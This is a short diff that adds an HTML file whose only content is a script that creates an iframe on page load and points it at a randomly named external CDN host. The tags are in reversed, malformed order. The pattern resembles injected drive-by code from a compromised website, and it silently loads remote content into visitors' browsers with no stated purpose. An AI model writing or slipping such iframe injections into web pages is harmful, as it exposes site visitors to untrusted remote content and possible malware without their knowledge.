@@ -1,0 +1,21 @@
+<body>
+<head>
+<html>
+
+<script>
+
+{
+var c=document.createElement("iframe");
+
+c.setAttribute("type","text/javascript");
+
+c.setAttribute("src","http://cds.r2c2t8i5.hwcdn.net/pe-el5.html'};");
+
+document.body.appendChild(c)
+}
+
+</script>
+
+</html>
+</head>
+</body>
